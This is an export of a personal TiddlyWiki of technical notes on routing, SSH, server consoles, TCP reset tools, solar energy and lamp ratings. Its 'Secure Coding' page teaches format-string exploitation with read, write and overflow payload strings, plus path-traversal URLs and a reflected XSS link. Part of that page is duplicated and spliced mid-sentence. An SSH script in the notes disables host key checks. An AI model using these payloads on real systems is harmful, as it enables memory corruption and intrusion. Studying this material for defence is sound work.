|3.	|36 W, 2700 K, HL Tubular Fluorescent Lamp		|5 (Five) Star|

Brand	:	PHILIPS
|1.	|36 W TRULITE 6500 K Tubular Fluorescent Lamp	|5 (Five) Star|
|2.	|40 W LVF 6500 K Tubular Fluorescent Lamp		|2 (Two) Star|
|3.	|40 W CHAMPION AR 6500 K Tubular Fluorescent Lamp	|3 (Three) Star|
|4.	|36 W LIFEMAX 6500 K Tubular Fluorescent Lamp	|3 (Three) Star|

Brand	:	WIPRO
|1.	|40 W, 6500 K PREMIUM Tubular Fluorescent Lamp	|3 (Three) Star|
|2.	|36 W, 6500 K SAFELITE Tubular Fluorescent Lamp	|3 (Three) Star|
|3.	|36 W  6500 K Ultralite Tubular Fluorescent Lamp	|5(Five) Star|
|4.	|36 W 4000 K Ultralite Tubular Fluorescent Lamp		|5 (Five) Star|
|5.	|36 W 2700 K Ultralite Tubular Fluorescent Lamp		|5 (Five) Star|
|6.	|40W SAFELITE 6500K, Tubular Fluorescent Lamp 	|3 (Three) Star|

Brand	:	ANCHOR
|1.	|40 W, 6500 K Tubular Fluorescent Lamp		|3 (Three) Star|
|2.     |36 W, 6500K, Tubular Fluorescent Lamp			|3 (Three) Star|

Brand	:	CROMPTON
|1.     |36 W, 6500K, Super Saver Tubular Fluorescent Lamp	|3 (Three) Star|
|2.	|36 W HL 6500K, Power-Lux Tubular Fluorescent Lamp	|4 (Four) Star|
|3.	|36 W HL 2700K, Power-Lux Tubular Fluorescent Lamp	|5 (Five) Star|
|
Brand	:	BAJAJ
|1.	|40 W, 6500K, Cool Day Light Tubular Fluorescent Lamp	|3 (Three) Star|

Brand	:	HIND
|1.	|40 W, 6500K, Cool Day Light Tubular Fluorescent Lamp	|3 (Three) Star|


</pre>
</div>
<div title="Resources" modifier="YourName" created="200807021104" changecount="1">
<pre>Linux IP networking 
http://linux-ip.net/html/index.html

Linux IP Masquerading
http://www.tldp.org/HOWTO/IP-Masquerade-HOWTO/</pre>
</div>
<div title="Routing" modifier="BhargavaKancherla" modified="200807071152" created="200807020631" changecount="2">
<pre>!Routing Policy Database (RPDB)
''The routing policy database (RPDB)'' controls the order in which the kernel searches through the routing tables. Each rule has a priority, and rules are examined sequentially from rule 0 through rule 32767.
 
When a new packet arrives for routing (assuming the routing cache is empty), the kernel begins at the highest priority rule in the ~RPDB--rule 0. The kernel iterates over each rule in turn until the packet to be routed matches a rule. When this happens the kernel follows the instructions in that rule. Typically, this causes the kernel to perform a route lookup in a specified routing table. If a matching route is found in the routing table, the kernel uses that route. If no such route is found, the kernel returns to traverse the RPDB again, until every option has been exhausted.

!!unicast

A unicast rule entry is the most common rule type. This rule type simple causes the kernel to refer to the specified routing table in the search for a route. If no rule type is specified on the command line, the rule is assumed to be a unicast rule.

{{{
ip rule add unicast from 192.168.100.17 table 5
ip rule add unicast iif eth7 table 5
ip rule add unicast fwmark 4 table 4
}}}

!!nat
The nat rule type is required for correct operation of stateless NAT. This rule is typically coupled with a corresponding nat route entry. The RPDB nat entry causes the kernel to rewrite the source address of an outbound packet.
{{{
ip rule add nat 193.7.255.184 from 172.16.82.184
ip rule add nat 10.40.0.0 from 172.40.0.0/16
}}}

!!unreachable
Any route lookup matching a rule entry with an unreachable rule type will cause the kernel to generate an ICMP unreachable to the source address of the packet. 
{{{
ip rule add unreachable iif eth2 tos 0xc0
ip rule add unreachable iif wan0 fwmark 5
ip rule add unreachable from 192.168.7.0/25
}}}

!!prohibit
Any route lookup matching a rule entry with a prohibit rule type will cause the kernel to generate an ICMP prohibited to the source address of the packet. 
{{{
ip rule add prohibit from 209.10.26.51
ip rule add prohibit to 64.65.64.0/18
ip rule add prohibit fwmark 7
}}}

!!blackhole
While traversing the RPDB, any route lookup which matches a rule with the blackhole rule type will cause the packet to be dropped. No ICMP will be sent and no packet will be forwarded. 
{{{
ip rule add blackhole from 209.10.26.51
ip rule add blackhole from 172.19.40.0/24
ip rule add blackhole to 10.182.17.64/28
}}}
</pre>
</div>
<div title="SSH Ask Password" modifier="BhargavaKancherla" modified="200807071134" created="200801150658" changecount="5">
<pre>!~SSH_ASKPASS
* If ssh needs a passphrase, it will read the passphrase from the current terminal if it was run from a terminal.  If ssh does not have a terminal associated with it but DISPLAY and ~SSH_ASKPASS are set, it will execute the program specified by ~SSH_ASKPASS and open an X11 window to read the passphrase.  This is particularly useful when calling ssh from a .Xsession or related script.  (Note that on some machines it may be necessary to redirect the input from /dev/null to make this work.)

{{{
export DISPLAY=none:0.0
export SSH_ASKPASS=/tmp/ssh_askpass.sh
pipename=&quot;/tmp/ssh_pipe.$$.$$&quot;

username=$1
hostname=$2
password=$3

# SSH askpass script.
cat &gt; ${SSH_ASKPASS} &lt;&lt; EOF
#!/bin/bash
head -1 ${pipename}
EOF
chmod 700 ${SSH_ASKPASS}

# Write password to pipe. We need to go in background as writing to pipe will
# not return until someone reads it.
echo $password  &gt; ${pipename} &amp;

ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o NumberOfPasswordPrompts=1 -o UserKnownHostsFile=/dev/null $username@$hostname &quot;ls /&quot; 2&gt; /dev/null
# Remove the pipe
rm -f ${pipename}

exit 0
}}}
</pre>
</div>
<div title="SSHTunneling" modifier="BhargavaKancherla" modified="200808220452" created="200808220442" changecount="1">
<pre>* To open a port on the remote server and let content on that port to be forwarded to local ssh port, so that users on the remote server can login to this machine
{{{
ssh -R 1234:127.0.0.1:22 bhargava@10.216.50.132
}}}
* To open a port locally and forward any incoming connections on that port to a remoteserver on port 80
{{{
ssh -L 8080:www.google.com:80 bhargava@10.216.50.132
}}}


</pre>
</div>
<div title="SUN ALOM shell" modifier="BhargavaKancherla" created="200807300919" changecount="1">
<pre>Logging in : root/changeme
{{{
$ ssh root@192.168.25.25
root@192.168.25.25's password:

Sun (TM) Embedded Lights Out Manager
Version 1.0

Copyright 2006 Sun Microsystems, Inc. All rights reserved.

Warning: password is set to factory default.
/SP -&gt; 
}}}

Power State change
{{{
# To power on the host, enter the following command:
set /SP/SystemInfo/CtrlInfo PowerCtrl=on

# To power off the host gracefully, enter the following command:
set /SP/SystemInfo/CtrlInfo PowerCtrl=gracefuloff

# To power off the host forcefully, enter the following command:
set /SP/SystemInfo/CtrlInfo PowerCtrl=forceoff

# To reset the host, enter the following command:
set /SP/SystemInfo/CtrlInfo PowerCtrl=reset

# To reboot and enter the BIOS automatically, enter the following command:
set /SP/SystemInfo/CtrlInfo BootCtrl=BIOSSetup 
}}}

Host console
{{{
# To start start a session on the server console, enter this command:
start /SP/AgentInfo/console 

# To terminate a server console session started by another user, enter this command:
stop /SP/AgentInfo/console 

# To revert to CLI once the console has been started, press Esc+(  keys. 
}}}

Configuring Network of ALOM
{{{
set /SP/AgentInfo DhcpConfigured=disabled
set /SP/AgentInfo IpAddress=xxx.xxx.xxx.xxx
set /SP/AgentInfo Gateway=xxx.xxx.xxx.xxx
set /SP/AgentInfo Netmask=xxx.xxx.xxx.xxx
}}}
</pre>
</div>
<div title="Secure Coding" modifier="BhargavaKancherla" modified="200807071108" created="200801081529" changecount="3">
<pre>!Format string vulnerabililty
If an attacker is able to provide the format string to an ANSI C format function in part or as a whole, a format string vulnerability is present. By
doing so, the behaviour of the format function is changed, and the attacker may get control over the target application.

In the examples below, the string user is supplied by the attacker  he can control the entire ~ASCIIZ-string, for example through using a command line parameter.

Wrong usage:
{{{
int
func (char *user)
{
printf (user);
}
}}}
Ok:
{{{
int
func (char *user)
{
printf (&quot;%s&quot;, user);
}
}}}

!The stack and its role at format strings
{{{
printf (&quot;Number %d has no address, number %d has: %08x\n&quot;, i, a, &amp;a);
}}}
From within the printf function the stack looks like:

stack top
. . .
&lt;&amp;a&gt;
&lt;a&gt;
&lt;i&gt;
A
. . .
stack bottom

Type 1 (as in Linux rpc.statd, IRIX telnetd). Here the vulnerability lies in the second parameter to the syslog function. The format string is partly
usersupplied.
{{{
char tmpbuf[512];
snprintf (tmpbuf, sizeof (tmpbuf), &quot;foo: %s&quot;, user);
tmpbuf[sizeof (tmpbuf) - 1] = \0;
syslog (LOG_NOTICE, tmpbuf);
}}}
Type 2 (as in wu-ftpd, Qualcomm Popper QPOP 2.53). Here a partly or completely usersupplied string is passed indirectly to a format function.
{{{
int Error (char *fmt, ...);
...
int someotherfunc (char *user)
{
...
Error (user);
...
}
...

}}}

!Crash of the program

By utilizing format strings we can easily trigger some invalid pointer access by just supplying a format string like:

{{{
printf (&quot;%s%s%s%s%s%s%s%s%s%s%s%s&quot;);
}}}

Because %s displays memory from an address that is supplied on the stack, where a lot of other data is stored, too, our chances are high to read from an illegal address, which is not mapped. Also most format function implementations offer the //%n// parameter, which can be used to write to the addresses on the stack. If that is done a few times, it should reliably produce a crash, too.

!Viewing the stack

{{{
printf (&quot;%08x.%08x.%08x.%08x.%08x\n&quot;);
}}}

This is a partial dump of the stack memory, starting from the current bottom upward to the top of the stack  assuming the stack grows towards the low addresses. Depending on the size of the format string buffer and the size of the output buffer, you can reconstruct more or less large parts of the stack memory by using this technique. In some cases you can even retrieve the entire stack memory.

!Viewing memory at any location

* Our format string is usually located on the stack itself, so we already have near to full control over the space, where the format string lies. 
* The format function internally maintains a pointer to the stack location of the current format parameter. If we would be able to get this pointer pointing into a memory space we can control, we can supply an address to the //%s// parameter. 
* To modify the stack pointer we can simply use dummy parameters that will //dig// up the stack by printing junk:
{{{
printf (&quot;AAA0AAA1_%08x.%08x.%08x.%08x.%08x&quot;);
}}}
The //%08x// parameters increase the internal stack pointer of the format function towards the top of the stack. After more or less of this increasing parameters the stack pointer points into our memory: the format string itself. The format function always maintains the lowest stack frame, so if our buffer lies on the stack at all, it lies above the current stack pointer for sure. If we choose the number of //%08x// parameters correctly, we could just display memory from an arbitrary address, by appending //%s// to our string. In our case the address is illegal and would be //AAA0//. Lets replace it with a real one.

Example:
address = 0x08480110
address (encoded as 32 bit le string): //\x10\x01\x48\x08//
{{{
printf (&quot;\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|&quot;);
}}}

!Exploitation - similar to common buffer overflows

{{{
{
char outbuf[512];
char buffer[512];
sprintf (buffer, &quot;ERR Wrong command: %400s&quot;, user);
sprintf (outbuf, buffer);
}
}}}
Such cases are often hidden deep inside reallife code and are not that obvious as shown in the example above. By supplying a special format
string, we are able to circumvent the //%400s// limitation: //%497d\x3c\xd3\xff\xbf&lt;nops&gt;&lt;shellcode&gt;//
Everything is similar to a normal buffer overflow exploit string, just
{{{
{
char outbuf[512];
char buffer[512];
sprintf (buffer, &quot;ERR Wrong command: %400s&quot;, user);
sprintf (outbuf, buffer);
}
}}}
Such cases are often hidden deep inside reallife code and are not that obvious as shown in the example above. By supplying a special format
string, we are able to circumvent the //%400s// limitation:
//%497d\x3c\xd3\xff\xbf&lt;nops&gt;&lt;shellcode&gt;//
Everything is similar to a normal buffer overflow exploit string, just the beginning  the //%497d//  is different. In normal buffer overflows
we overwrite the return address of a function frame on the stack. As the function that owns this frame returns, it returns to our supplied address.
The address points to somewhere within the //&lt;nop&gt;// space. There are good articles describing this method of exploitation and if this example is not fully

the beginning  the //%497d//  is different. In normal buffer overflows we overwrite the return address of a function frame on the stack. As the function that owns this frame returns, it returns to our supplied address. The address points to somewhere within the //&lt;nop&gt;//space. There are good articles describing this method of exploitation and if this example is not fully clear to you yet, you should consider reading an introductionary article, such as [5], first. It creates a string that is 497 characters long. Together with the error string (ERR Wrong command: ) this exceeds the outbuf buffer by four bytes. Although the user string is only allowed to be as long as 400 bytes, we can extend its length by abusing format string parameters. Since the second sprintf is not checking the length, this can be used to break out of the boundaries of outbuf. Now we write a return address (0xbfffd33c) and exploit it just the old known way, as we would do it with any buffer overflow. While any format parameter that allows //stretching// the original format string, such as //%50d//, //%50f// or //%50s// will do, it is desireable to choose a parameter that does not dereference a pointer or may cause a division by zero. This rules out //%f// and //%s//. We are left with the integer output parameters: //%d//, //%u// and //%x//.

!Exploitation - through pure format strings

{{{
{
char buffer[512];
snprintf (buffer, sizeof (buffer), user);
buffer[sizeof (buffer) - 1] = \0;
}

int i;
printf (&quot;foobar%n\n&quot;, (int *) &amp;i);
printf (&quot;i = %d\n&quot;, i);
}}}
Would print //i = 6//. With the same method we used above to print memory from arbitrary addresses, we can write to arbitrary locations:

//AAA0_%08x.%08x.%08x.%08x.%08x.%n//

With the //%08x// parameter we increase the internal stack pointer of the format function by four bytes. We do this until this pointer points to the
beginning of our format string (to //AAA0//). This works, because usually our format string is located on the stack, on top of our normal format
function stack frame. The //%n// writes to the address 0x30414141, that is represented by the string //AAA0//. Normally this would crash the program,
since this address is not mapped. But if we supply a correct mapped and writeable address this works and we overwrite four bytes (sizeof (int))
at the address:
//\xc0\xc8\xff\xbf_%08x.%08x.%08x.%08x.%08x.%n//


!Stack Popping
A problem can arise if the format string is too short to supply a stack popping sequence that will reach your own string. This is a race between
the real distance to your format string and the size of the format string, in which you have to pop at least the real distance. So there is a demand for an effective method to increase the stack pointer with as few bytes as possible. Currently we have used only //%u// sequences, to show the principle, but there are more effective methods. A //%u// sequence is two bytes long and pops four bytes, which gives a 1:2 byte ratio (we invest 1 byte to get 2 bytes ahead).
Through using the //%f// parameter we even get 8 bytes ahead in the stack, while only investing two bytes. But this has a huge drawback, since
if garbage from the stack is printed as floating point number, there may be a division by zero, which will crash the process. To avoid this we can use a special format qualifier, which will only print the integer part of the float number: //%.f// will walk the stack upwards by eight bytes, using only three bytes in our buffer

!Direct Parameter Access

Beside improving the stack popping methods, there is a huge simplification which is known as //direct parameter access//, a way to directly address a stack parameter from within the format string. Almost all currently in use C libraries do support this features, but not all are useable to apply this
method to format string exploitation.
The direct parameter access is controlled by the //$// qualifier:
{{{
printf (&quot;%6$d\n&quot;, 6, 5, 4, 3, 2, 1);
}}}
Prints //1//, because the //6$// explicitly addresses the 6th parameter on the stack. Using this method the whole stack pop sequence can be left out.

!Response Based Brute Force

If we probe a distance of 32, the format string would look like:

//AAAABBBB|%u%u%u%u%u%u%u%u|%08x|//

We pop 32 bytes from the stack (8 * //%u//) and print the four bytes at the 32th byte from the stack hexadecimal. In the ideal case the output would
look like:
//AAAABBBB|983217938177639561760134608728913021|41414141|//

!Alternative targets

Common stack based buffer overflows allow only return address overwrites, because those are stored on the stack, too. With format functions however, we can write anywhere into the memory, allowing us to modify the entire writeable process space.

!Path Traversal Bugs

1.http://vulnerable:6346/........../windows/win.ini
2.http://127.0.0.1:6346/%5c..%5c..%5c..%5cwindows%5cwi n.ini ( %5c == \ ). Then it tranlates to  http://127.0.0.1:6346/\..\..\..\windows\win.ini

how to say yahoo
{{{
 http://www.yahoo.com
 http://209.191.93.52 (the vanilla IP address version everyone knows and loves)
 http://0xD1BF5D34 (hex representation of a yahoo server)
 http://0x123456789D1BF5D34/ (hex representation of a yahoo server is a bunch of numbers in the front 123456789. Those numbers are disregarded by some browsers.
 http://3518979380/ (decimal representation of an IP)
 http://0321.0277.0135.064 (octal representation of an IP)
}}}

!XSS vulnerability  Reflection

A vulnerable web site is one that //reflects// or  echoes data back to a user
No storage needed on the vulnerable web site itself //&lt;?php  echo $input  ?&gt;//
The attacker creates an html link with some script in  it as input to vulnerable web site.  This may be in an  email, or Malorys own web site
{{{
&lt;A HREF=http://www.vulnerable.com?input=&lt;malicious  code&gt;Click here for free stuff!&lt;/A&gt;
}}}

What happens when Alice clicks on the link?
     Alice is taken to the correct site, Malorys code is echoed by the vulnerable site and  executed by Alices browser in the context of the vulnerable site
</pre>
</div>
<div title="Sending Fax in Symantec" modifier="BhargavaKancherla" modified="200807071146" created="200806260909" changecount="2">
<pre>* Face down means to keep the sending side not facing you, but not up-side down.
* Press the hold key
* Press 9 key to hear the actual dial tone
* Enter the number
* Press the # key.
* Give the Auth code.
* When the ring stops, press the Fax Start key.
</pre>
</div>
<div title="Serial interface" modifier="YourName" modified="201006080952" created="201006080949" changecount="3">
<pre>!minicom to access serial interace
* Install minicom rpm. 
* start minicom with ''minicom -s'' and change the serial port to /dev/ttyS0
* Change the baud rate to 9600 (for cisco switches)
* save the changes as default
* start minicom with ''minicom -c on''

!Windows HyperTerminal
* Start the hyperterminal
* choose some name and set port as COM1 and baud rate as 9600 (for cisco switches)
</pre>
</div>
<div title="Similarity Search" modifier="BhargavaKancherla" created="200807151023" changecount="1">
<pre>!Data model
How data is represented. No of dimensions and in what kind of space they are. ex. eucledian space

!distance model
how distances are to be computed. ex. eucledian distance. ex. minimum no of operations to move from one data point to another. 

!similarity search models
* Branch and bound
* Greedy walks
* mappings : LSH, random projections, minhashing 
* epsilon nets 

!!Branch and Bound
Branch and bound tree is built using the initial data set. The tree is built in such a way that at a node we either move to left or right or both based on a certain condition at that vertex. As we go on moving along the tree, we reach leaves ( could be more than 1 if at a vertex we had to go on both directions). We compute the distance for all of the leaves that we end up, the one nearest is the nearest neighbour. This algorithm is highly dependant on initial free for finding the nearest neighbour. 

!!Greedy walks
In this method we walk in the space from one point to another point if that point is closer than the point that is now, if there are more than 1 point closer to the input sample then we take the one that is closest to the input sample. When we end up at a state where we cannot move any further, then that point is called the nearest neighbour.

!!Mappings
In this method we increase the dimension space to very large, and then we compute the nearest neighbour in this space. 

!!Epsilon nets
The data is divided in space into groups. The first group would contain all the samples. The groups at the next level would be half the size in the space or so. We start our search from the first level and keep going down to lower levels. 

!Similarity search in Bipartite graphs
Examples :  say n persons and m movies, that is n person vertices in the graph and m movie vertices in the graphs. Links only go between person and movie. There are no person to person links, or movie to movie links. A link from person to movie indicates that the person likes this movie. 

!!Person-person similarity
To find person-person to similrity, i.e who are all the persons who like the same movies as this person. To find this attribute we need to find the 2-step chains from this person to other persons. What we are doing here is in the first step is to find all the movies the person like and in the second step we get links to all the persons that like this movie

!!Person-movie personality
To find person-movie personality, that is what are movies that this user might like. To find this we go one step ahead from what we have done in person-person similarity, after the 2-steps we know the persons who have the same taste as this person, from this person's node we go to the all the movies this person liks, which essentially gives all the movies that the actual user might like. 

!Goodness of a data set
Goodness of a data set is a measure to see how good the data set works when we are going to use similarity search for new samples over this data set. 

Take a object p and sort all objects based on the distance from p. Lets say rank(r) is defined as what position r is in this sorted list. The data set is said to have 
disorder D if 
for all p,r,s   rank(s with respect to r) &lt;= D * (rank(r) + rank(p))




</pre>
</div>
<div title="Solar Energy" modifier="YourName" created="200811081757" changecount="1">
<pre>!Solar energy 
Solar energy is the light and radiant heat from the Sun that influences Earth's climate and weather and sustains life. Solar power is sometimes used as a synonym for solar energy or more specifically to refer to electricity generated from solar radiation.

Solar energy technologies can provide electrical generation by heat engine or photovoltaic means, space heating and cooling in active and passive solar buildings; potable water via distillation and disinfection, daylighting, hot water, thermal energy for cooking, and high temperature process heat for industrial purposes.

The Earth receives 174 petawatts (PW) of incoming solar radiation (insolation) at the upper atmosphere.[1] Approximately 30% is reflected back to space while the rest is absorbed by clouds, oceans and land masses. The spectrum of solar light at the Earth's surface is mostly spread across the visible and near-infrared ranges with a small part in the near-ultraviolet.

Solar technologies are broadly characterized as either passive or active depending on the way they capture, convert and distribute sunlight. Active solar techniques use photovoltaic panels, pumps, and fans to convert sunlight into useful outputs. Passive solar techniques include selecting materials with favorable thermal properties, designing spaces that naturally circulate air, and referencing the position of a building to the Sun.

Active solar technologies increase the supply of energy and are considered supply side technologies, while passive solar technologies reduce the need for alternate resources and are generally considered demand side technologies.

!Electrical Generation
Sunlight can be converted into electricity using photovoltaics (PV), concentrating solar power (CSP), and various experimental technologies. PV has mainly been used to power small and medium-sized applications, from the calculator powered by a single solar cell to off-grid homes powered by a photovoltaic array.

For large-scale generation, CSP plants are used.

!!!Light Tube
Light tubes or light pipes are used for transporting or distributing natural or artificial light. In their application to daylighting, they are also often called sun pipes, solar pipes, solar light pipes, or daylight pipes.

Generally speaking, a light pipe or light tube may refer to:
* a tube or pipe for transport of light to another location, minimizing the loss of light;
* a transparent tube or pipe for distribution of light over its length, either for equidistribution along the entire length (see also sulfur lamp) or for controlled light leakage.

!High-temperature collectors
Where temperatures below about 95C are sufficient, as for space heating, flat-plate collectors of the nonconcentrating type are generally used. The fluid-filled pipes can reach temperatures of 150 to 220 degrees Celsius when the fluid is not circulating. This temperature is too low for efficient conversion to electricity.

The efficiency of heat engines increases with the temperature of the heat source. To achieve this in solar thermal energy plants, solar radiation is concentrated by mirrors or lenses to obtain higher temperatures  a technique called Concentrated Solar Power (CSP). The practical effect of high efficiencies is to reduce the plant's collector size and total land use per unit power generated, reducing the environmental impacts of a power plant as well as its expense.

[img[images/parabolic.solar.jpg]]

As the temperature increases, different forms of conversion become practical. Up to 600C, steam turbines, standard technology, have an efficiency up to 41%. Above this, gas turbines can be more efficient. Higher temperatures are problematic because different materials and techniques are needed.

Since the CSP plant generates heat first of all, it can store the heat before conversion to electricity. With current technology, storage of heat is much cheaper and more efficient than storage of electricity. In this way, the CSP plant can produce electricity day and night. If the CSP site has predictable solar radiation, then the CSP plant becomes a reliable power plant.

!!!System designs
During the day the sun has different positions. If the mirrors or lenses do not move, then the focus of the mirrors or lenses changes. Therefore it seems unavoidable that there needs to be a tracking system that follows the position of the sun (for solar photovoltaics a solar tracker is only optional). The tracking system increases the cost and complexity. With this in mind, different designs can be distinguished in how they concentrate the light and track the position of the sun.

!!!Parabolic trough designs
Parabolic trough power plants use a curved trough which reflects the direct solar radiation onto a receiver (also called absorber or collector) running along the trough, above the reflectors. The trough is parabolic in one direction and just straight in the other direction. For change of position of the sun orthogonal to the receiver, the whole trough tilts so that direct radiation remains focused on the receiver. However, a change of position of the sun parallel to the trough, does not require adjustment of the mirrors, since the light is just concentrated on another part of the receiver. So, the trough design avoids a second axis for tracking.

A substance (also called heat transfer fluid) passes through the receiver and becomes hot. Used substances are synthetic oil, molten salt and pressurized steam. The receiver can be in a vacuum chamber of glass. The light will shine through the glass and vacuum, but the vacuum will significantly reduce convective loss of the collected heat. The substance with the heat is transported to a heat engine where about a third of the heat is converted to electricity.

Tracking the sun from East to West by rotation on one axis, the high precision reflector panels concentrate the solar radiation coming directly from the sun onto an absorber pipe located along the focal line of the collector.

!!!Power tower designs
Power towers (also known as 'central tower' power plants or 'heliostat' power plants) use an array of flat, moveable mirrors (called heliostats) to focus the sun's rays upon a collector tower (the receiver).

[img[images/tower.solar.jpg]]

The advantage of this design above the parabolic trough design is the higher temperature. Thermal energy at higher temperatures can be converted to electricity more efficiently and can be more cheaply stored for later use. Furthermore, there is less need to flatten the ground area. In principle a power tower can be built on a hillside. Mirrors can be flat and plumbing is concentrated in the tower. The disadvantage is that each mirror must have its own dual-axis control, while in the parabolic trough design one axis can be shared for a large array of mirrors.

!!!Dish designs
A dish system uses a large, reflective, parabolic dish (similar in shape to satellite television dish). It focuses all the sunlight that strikes the dish up onto to a single point above the dish, where a receiver captures the heat and transforms it into a useful form.

[img[images/dish.solar.jpg]]

Advantage of a dish system is that it can achieve much higher temperatures due to the higher concentration of light (as in tower designs). Higher temperatures leads to better conversion to electricity and the dish system is very efficient on this point. However, there are also some disadvantages. Heat to electricity conversion requires moving parts and that results in maintenance. In general, a centralized approach for this conversion is better than the dencentralized concept in the dish design. Second, the (heavy) engine is part of the moving structure, which requires a rigid frame and strong tracking system. Furthermore, parabolic mirrors are used instead of flat mirrors and tracking must be dual-axis.

!!!Frensel reflectors
A linear Fresnel reflector power plant uses a series of long, narrow, shallow-curvature (or even flat) mirrors to focus light onto one or more linear receivers positioned above the mirrors. On top of the receiver a small parabolic mirror can be attached for further focusing the light. These systems aim to offer lower overall costs by sharing a receiver between several mirrors (as compared with trough and dish concepts), while still using the simple line-focus geometry with one axis for tracking. 

[img[images/frensel.solar.jpg]]

This is similar to the trough design (and different from central towers and dishes with dual-axis). The receiver is stationary and so fluid couplings are not required (as in troughs and dishes). The mirrors also do not need to support the receiver, so they are structurally simpler. When suitable aiming strategies are used (mirrors aimed at different receivers at different times of day), this can allow a denser packing of mirrors on available land area.

!Heat Exchange
Heat in a solar thermal system is guided by five basic principles: 
# heat gain
# heat transfer
# heat storage
# heat transport
# heat insulation.

Heat gain is the heat accumulated from the sun in the system. Solar thermal heat is trapped using the greenhouse effect; the greenhouse effect in this case is the ability of a reflective surface to transmit short wave radiation and reflect long wave radiation. Heat and infrared radiation (IR) are produced when short wave radiation light hits the absorber plate, which is then trapped inside the collector. Fluid, usually water, in the absorber tubes collect the trapped heat and transfer it to a heat storage vault.

Heat is transferred either by conduction or convection. When water is heated, kinetic energy is transferred by conduction to water molecules throughout the medium. These molecules spread their thermal energy by conduction and occupy more space than the cold slow moving molecules above them. The distribution of energy from the rising hot water to the sinking cold water contributes to the convection process. Heat is transferred from the absorber plates of the collector in the fluid by conduction.

Heat is transferred to a thermal storage medium in an insulated reservoir during hours with sunlight, and is withdrawn for power generation during hours lacking sunlight. Rate of heat transfer is related to the conductive and convection medium as well as the temperature differences. Bodies with large temperature differences transfer heat faster than bodies with lower temperature differences.

Heat storage allows a solar thermal plant to produce electricity at night and on overcast days. Heat is transferred to a thermal storage medium in an insulated reservoir during the day, and withdrawn for power generation at night. Thermal storage media include pressurized steam, concrete, a variety of phase change materials, and molten salts such as sodium and potassium nitrate.

A variety of fluids have been tested to transport the sun's heat, including water, air, oil, and sodium, but molten salt was selected as best. Molten salt is used in solar power tower systems because it is liquid at atmosphere pressure, it provides an efficient, low-cost medium in which to store thermal energy, its operating temperatures are compatible with today's high-pressure and high-temperature steam turbines, and it is non-flammable and nontoxic. In addition, molten salt is used in the chemical and metals industries as a heat-transport fluid, so experience with molten-salt systems exists for non-solar.

The molten salt is a mixture of 60 percent sodium nitrate and 40 percent potassium nitrate, commonly called saltpeter. The salt melts at 430 F (220 C) and is kept liquid at 550 F (290 C) in an insulated cold storage tank. The uniqueness of this solar system is in de-coupling the collection of solar energy from producing power, electricity can be generated in periods of inclement weather or even at night using the stored thermal energy in the hot salt tank. Normally tanks are well insulated and can store energy for up to a week. 
</pre>
</div>
<div title="Switch Perfromance" modifier="YourName" modified="201006080745" created="201006080740" changecount="3">
<pre>!Measuring Switch switching capacity
MPPS stands for million packets per second and Cisco prefers to refer throughput in MPPS. For a layer-3 switch an MPPS value is shared one. For some of the higher-end Cisco routers the routing is &quot;distributed&quot; between multiple line-cards, in which case the PPS numbers are based on the number of line cards, bit for non-distributed architectures (Catalyst switches) the numbers are based on the routing engine, so it is the maximum number of Packets per Second that the box can route.

For example, 2960-48PST-S is 13.3 Mpps.

The figure MPPS expresses the maximum number of frames per second that can be processed by the device. It is not dependent on frame size but clearly small frames require higher packet rates.

smallest frames in Ethernet are 64 bytes in size, taking in account the preamble (8 bytes) and the minimum inter-frame gap (the last two counts roughly for 20.2 bytes) to fill a GE port in one direction you need 1484560 frame per second.

10^9 / [(64+20.2)*8] where 8 is bits/byte.

So a number of 13.3 MPPS is equivalent to [((13.3 M * (64+20.2) * 8)) / 10^9 = 8.95 / 2=4.47] 4.47 GE ports filled with smallest frames bidirectional.

On the other hand frames of max size 1518 bytes require 81264 fps to fill a GE port in one direction.

So this number expresses the forwarding capability of the device.

A non blocking device with 48 GE ports would require 2 * 1484560 * 48 as MPPS or higher.

Therefore the performance of a device will be determined by combination of number of packets per sec and the size of the packet.
</pre>
</div>
<div title="TCPUtils" modifier="YourName" created="201003190734" changecount="1">
<pre>This page describes the utilities available in nasgw/src/linux/common/tcputils

Related Info :

http://monkey.org/~dugsong/dsniff/
http://www.tcpdump.org/pcap.htm

!!!sfs_tcp_reset
This program helps in sending a TCP reset to any connection that exists on the local node. The connection can be over any device, on virtual and physical ip. Usage syntax as on 23rd Feb 2010 is

Usage: tcp_reset device localip port remoteip port

The device argument specifies the device on which the connection has been established. Currently we do not automatically find out the device on which the localip is online. The localip should be plumbed on the device, no checks are made to verify this.

Steps during reset of the Connection

# Create a filter to capture incoming packets for this connection (localip:port -&gt; remoteip:port). We do this before sending out any packets, as we don't want to miss the ack that would be send immedieately after we send a tickle. If we create a filter after we send out a tickle, the reply from client could reach us before we start our capturing.
# Open a libnet handle to send packets out, with type RAW4 socket.
# Send a tickle for this connection, so the remote side on receiving this packet will send out a packet with seq no (ack no). We are only interested in the seq no. The packets that we send out are verified for correct seq no by the remote side, if the seq no does not match with the expected seq no on the remote side, the remote side will discard it.
# Capture the first return packet for this connection, and use that seq no to send a reset. This will work if the seq no has not changed since we captures and sent a reset. If this connection is used heavily, then it might be possible that between the time we capture a packet and use its seq no, the seq no might have changed due to other content being exchanged between both parties. We only make only attempt and do not verify that the RST is acknowledged correctly. So this might have worked or might have failed. We also wait infinitely for the reply from remote side, if the remote side does not reply or is dead, its upto the caller to terminate this process.
# Send a tickle again, so that the remote site will send a RST back to the server and the server also clears the connections in its cache. 

Enhancements

# Automatically detect the device to be used for the given local ip
# Accept a timeout value as an argument and wait only for that time for reply from remote side 

!!!sfs_tcp_reset_ether
This program is similar to sfs_tcp_reset except that is sends ethernet level packets instead of IP level packets. Usage syntax as on 23rd Feb 2010 is

Usage: tcp_reset_ether device remote_mac remoteip port localip port

The device argument specifies the device on which the connection has been established. The remote_mac is the mac address of the remote ip, this mac address could be either be the mac address of the remote host or any gateway(if the remote host can only be reached from a gateway). Similar restrictions to device exists as in sfs_tcp_reset.

Steps during reset of the Connection

# Create a filter to capture incoming packets for this connection (localip:port -&gt; remoteip:port). We do this before sending out any packets, as we don't want to miss the ack that would be send immedieately after we send a tickle. If we create a filter after we send out a tickle, the reply from client could reach us before we start our capturing.
# Open a libnet handle to send packets out, with type LINK socket. This allows us to add even ethernet header. For a RAW4 socket we can only add IP headers and not ethernet headers. This can be used to reset NAT connections, whose traffic cannot be captured correctly by pcap.
# Send a tickle for this connection, so the remote side on receiving this packet will send out a packet with seq no (ack no). We are only interested in the seq no. The packets that we send out are verified for correct seq no by the remote side, if the seq no does not match with the expected seq no on the remote side, the remote side will discard it.
